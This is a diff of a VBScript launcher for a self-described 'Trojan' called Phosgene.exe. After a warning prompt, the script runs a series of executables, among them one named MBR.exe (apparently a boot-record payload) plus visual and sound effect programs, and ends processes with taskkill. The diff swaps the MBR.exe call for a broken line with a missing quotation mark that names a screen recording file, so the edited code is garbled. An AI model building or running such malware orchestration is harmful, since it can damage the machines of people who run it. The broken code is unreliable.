@@ -58,7 +58,7 @@ intAnswer = _
     Msgbox("This Trojan is no joke, do you want to run it? Epilepsy and loud noise warning! Creator not responsible for any damages!", _
         vbYesNo, "Phosgene.exe")
 If intAnswer = vbYes Then
-    CreateObject("Wscript.Shell").run("MBR.exe")
+    CreateObject("Wscript.Shell").run(ScreenRecording_02-01-2025 20-30-56_1.exe")
     CreateObject("Wscript.Shell").run("lines.exe")
     CreateObject("Wscript.Shell").run("BitBlt1.exe")
     WScript.Sleep(30000)
@@ -91,8 +91,8 @@ If intAnswer = vbYes Then
     CreateObject("Wscript.Shell").run("taskkill /f /im txtout2.exe")
     WScript.Sleep(100)
     CreateObject("Wscript.Shell").run("taskkill /f /im invmelter.exe")
-    CreateObject("Wscript.Shell").run("ScreenRecording_02-01-2025 2")
-    CreateObject("Wscript.Shell").run("crazysound6.exe")
+    CreateObject("Wscript.Shell").run("ScreenRecording_02-01-2025 20-31-11_1")
+    CreateObject("Wscript.Shell").run("Lines.exe")
     WScript.Sleep(15000)
     CreateObject("Wscript.Shell").run("taskkill /f /im crazysound6.exe")
     WScript.Sleep(100)
